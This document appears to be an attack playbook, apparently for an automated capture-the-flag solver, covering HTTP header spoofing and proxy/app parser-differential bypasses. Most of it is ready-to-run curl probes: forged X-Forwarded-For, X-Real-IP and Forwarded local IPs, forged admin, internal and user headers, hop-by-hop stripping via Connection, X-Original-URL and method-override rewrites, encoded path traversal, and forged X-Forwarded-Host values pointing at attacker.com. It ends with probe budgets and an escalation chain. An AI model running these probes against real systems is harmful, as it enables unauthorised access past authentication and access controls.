# Per-mechanism deep — every parser-differential mechanism, exhaustively

The mechanism map — a header the app reads, a check the header gates.

---

## 1. The hop-by-hop bypass — the verified card's mechanism

```text
a proxy strips the headers it names in Connection — naming the proxy's
own header in Connection strips it — the app sees a request without
the trusted header — a missing-header fallback treats it as local —
the trust check bypassed.
```

```bash
# the mechanism's probes — the strip's names
curl "$BASE/api/restricted" -H 'Connection: keep-alive, X-Real-IP'   # the proxy's client-IP header
curl "$BASE/api/restricted" -H 'Connection: keep-alive, X-Forwarded-For'   # the forwarded header
curl "$BASE/api/restricted" -H 'Connection: keep-alive, X-Forwarded-Host'   # the forwarded host
curl "$BASE/api/restricted" -H 'Connection: keep-alive, X-Forwarded-Proto'   # the forwarded proto
curl "$BASE/api/restricted" -H 'Connection: keep-alive, X-Internal'   # the internal header
curl "$BASE/api/restricted" -H 'Connection: keep-alive, X-Admin'   # the admin header
curl "$BASE/api/restricted" -H 'Connection: keep-alive, X-Debug'   # the debug header
curl "$BASE/api/restricted" -H 'Connection: keep-alive, Authorization'   # the auth header
```

## 2. The client-supplied bypass — a forged proxy-header

```text
a client-supplied proxy header → the app trusts it → the app doesn't
verify the proxy added it → the client-supplied header IS trusted →
a forged local IP → a local request → the trust check bypassed.
```

```bash
# the mechanism's probes — the forged headers
curl "$BASE/api/admin" -H 'X-Real-IP: 127.0.0.1'   # a forged local IP
curl "$BASE/api/admin" -H 'X-Forwarded-For: 127.0.0.1'   # a forged local IP
curl "$BASE/api/admin" -H 'X-Client-IP: 127.0.0.1'   # a forged client-IP
curl "$BASE/api/admin" -H 'True-Client-IP: 127.0.0.1'   # a forged true-client-IP
curl "$BASE/api/admin" -H 'Forwarded: for=127.0.0.1'   # a forged RFC 7239
```

## 3. The forwarded-host rewrite — a stored injection

```text
a client-supplied X-Forwarded-Host → the app's links point to
attacker.com → the stored page's links fetch attacker.com → a stored-
injection reach.
```

```bash
# the mechanism's probes — the forged hosts
curl "$BASE/page" -H 'X-Forwarded-Host: attacker.com'   # a forged host
curl "$BASE/page" -H 'X-Host: attacker.com'   # a forged X-Host
curl "$BASE/page" -H 'X-Forwarded-Host: target.com'   # a forged same-host
```

## 4. The forwarded-scheme downgrade — a scheme confusion

```text
a client-supplied X-Forwarded-Scheme → the app's links use http → a
downgrade surface → a mixed-content or a downgrade → the downstream.
```

```bash
# the mechanism's probes — the forged schemes
curl "$BASE/page" -H 'X-Forwarded-Scheme: http'   # a forged scheme
curl "$BASE/page" -H 'X-Forwarded-Proto: http'   # a forged proto
```

## 5. The X-Original-URL rewrite — a path-rewrite

```text
a client-supplied X-Original-URL → the app's route rewritten → a
route-confusion.
```

```bash
# the mechanism's probes — the forged paths
curl "$BASE/page" -H 'X-Original-URL: /admin'   # a forged path
curl "$BASE/page" -H 'X-Original-URL: /internal'   # a forged internal path
curl "$BASE/page" -H 'X-Rewrite-URL: /admin'   # a forged rewrite-URL
```

## 6. The internal-flag bypass — a flag-forgery

```text
a client-supplied X-Internal → the internal-route check passes → the
internal route reached.
```

```bash
# the mechanism's probes — the forged internal flags
curl "$BASE/internal" -H 'X-Internal: true'   # a forged internal flag
curl "$BASE/internal" -H 'X-Internal: 1'   # a forged internal flag
curl "$BASE/internal" -H 'X-Internal: yes'   # a forged internal flag
```

## 7. The admin-flag bypass — a flag-forgery

```text
a client-supplied X-Admin → the admin check passes → the admin route
reached.
```

```bash
# the mechanism's probes — the forged admin flags
curl "$BASE/admin" -H 'X-Admin: true'   # a forged admin flag
curl "$BASE/admin" -H 'X-Admin: 1'   # a forged admin flag
curl "$BASE/admin" -H 'X-Admin: yes'   # a forged admin flag
```

## 8. The forwarded-for spoof — a local-IP forgery

```text
a client-supplied X-Forwarded-For → the local-vs-remote check passes →
a local request → the trust check bypassed.
```

```bash
# the mechanism's probes — the forged local IPs
curl "$BASE/api/admin" -H 'X-Forwarded-For: 127.0.0.1'   # a forged local IP
curl "$BASE/api/admin" -H 'X-Forwarded-For: ::1'   # a forged localhost
curl "$BASE/api/admin" -H 'X-Forwarded-For: 10.0.0.1'   # a forged internal IP
curl "$BASE/api/admin" -H 'X-Forwarded-For: 127.0.0.1, 8.8.8.8'   # a chained forwarded
```

## 9. The Forwarded-header spoof — an RFC 7239 forgery

```text
a client-supplied Forwarded header → the local-vs-remote check passes →
a local request → the trust check bypassed.
```

```bash
# the mechanism's probes — the forged RFC 7239 headers
curl "$BASE/api/admin" -H 'Forwarded: for=127.0.0.1'   # a forged local IP
curl "$BASE/api/admin" -H 'Forwarded: for=::1'   # a forged localhost
curl "$BASE/api/admin" -H 'Forwarded: for=127.0.0.1;host=attacker.com;proto=http'   # a chained forwarded
```

## 10. The path-normalization bypass — a normalization differential

```text
a path the proxy and the app normalize differently → the proxy's check
reads a different path than the app's → a route-confusion reach → a
gated route → the downstream.
```

```bash
# the mechanism's probes — the normalization differentials
curl "$BASE/static/../admin"   # a traversal boundary
curl "$BASE/%2e%2e/admin"   # an encoded traversal
curl "$BASE/%61dmin"   # an encoded 'a' — a case/encoding boundary
curl "$BASE/%2fadmin"   # an encoded '/'
curl "$BASE/page//admin"   # a double-slash boundary
curl "$BASE/page./admin"   # a dot-slash boundary
curl "$BASE/%252e%252e/admin"   # a doubly-encoded traversal
curl "$BASE/admin%20"   # a trailing-space boundary
curl "$BASE/admin%09"   # a trailing-tab boundary
curl "$BASE/admin%00"   # a trailing-null boundary
curl "$BASE/admin?"   # a trailing-? boundary
curl "$BASE/admin#"   # a trailing-# boundary
curl "$BASE/admin.html"   # a trailing-extension boundary
```

## 11. The method-override bypass — a method forgery

```text
a client-supplied X-HTTP-Method-Override → the method rewritten → a
method-override.
```

```bash
# the mechanism's probes — the forged methods
curl "$BASE/api" -H 'X-HTTP-Method-Override: DELETE' -d 'data'   # a forged method
curl "$BASE/api" -H 'X-Original-Method: PUT' -d 'data'   # a forged original-method
curl "$BASE/api" -H 'X-HTTP-Method: PATCH' -d 'data'   # a forged HTTP-method
curl "$BASE/api" -H 'X-Method-Override: DELETE' -d 'data'   # a forged method-override
```

## 12. The X-Forwarded-User spoof — a user forgery

```text
a client-supplied X-Forwarded-User → the user check passes → a forged
admin user.
```

```bash
# the mechanism's probes — the forged users
curl "$BASE/api/user" -H 'X-Forwarded-User: admin'   # a forged admin user
curl "$BASE/api/user" -H 'X-Forwarded-User: root'   # a forged root
curl "$BASE/api/user" -H 'X-Forwarded-User: user'   # a forged user
curl "$BASE/api/user" -H 'X-Forwarded-Email: admin@target.com'   # a forged email
```

## 13. The multi-proxy differential — a chained normalization

```text
a multi-proxy chain → a header each strips differently → a chained
normalization boundary → a per-layer differential → a gated route →
the downstream.
```

```bash
# the mechanism's probes — the chained normalizations
curl "$BASE/page" -H 'X-Forwarded-Host: attacker.com'   # the edge strips it; the origin doesn't
curl "$BASE/page" -H 'X-Forwarded-Proto: http'   # a chained normalization
curl "$BASE/page" -H 'X-Forwarded-User: admin'   # a chained user differential
curl "$BASE/page" -H 'X-Forwarded-Email: admin@target.com'   # a chained email differential
```

## 14. The multi-header bypass — a combined forgery

```text
a combined injection — a forged IP + a forged flag — a local + an
internal check → a privileged route reached.
```

```bash
# the mechanism's probes — the combined injections
curl "$BASE/api/internal" -H 'X-Real-IP: 127.0.0.1' -H 'X-Internal: true'   # a local + an internal
curl "$BASE/api/admin" -H 'X-Real-IP: 127.0.0.1' -H 'X-Admin: true'   # a local + an admin
curl "$BASE/api/user" -H 'X-Real-IP: 127.0.0.1' -H 'X-Forwarded-User: admin'   # a local + a user
curl "$BASE/api/debug" -H 'X-Real-IP: 127.0.0.1' -H 'X-Debug: true'   # a local + a debug
curl "$BASE/api" -H 'X-Forwarded-Host: attacker.com' -H 'X-Forwarded-Proto: http'   # a host + a scheme
curl "$BASE/api" -H 'X-Forwarded-Host: attacker.com' -H 'X-Forwarded-Scheme: http'   # a host + a scheme
```

## 15. The per-mechanism falsifier — when the mechanism is dead

```text
a proxy that doesn't strip its own header → the hop-by-hop bypass fails
a proxy that strips a client-supplied header → the client-supplied
  bypass fails → the hop-by-hop bypass is the vector
a proxy that verifies the header it added → the client-supplied bypass
  fails → the hop-by-hop bypass is the vector
a non-header check → a different class
the proxy and the app normalize the same way → no confusion
a stored copy → a cache-poisoning
a desync → a request-smuggling
a session check → an auth-session
a host check → a host-header
a fetch → an ssrf
a read → a cors
```

## 16. The per-mechanism budget — the probe limits

```text
5 probes or 15 minutes per mechanism class; 25 probes or 45 minutes
for the challenge. a spent budget → escalate: chain_match → reclassify
→ writeup_search → novel_plan → fanout_sweep → solver_handoff.
```
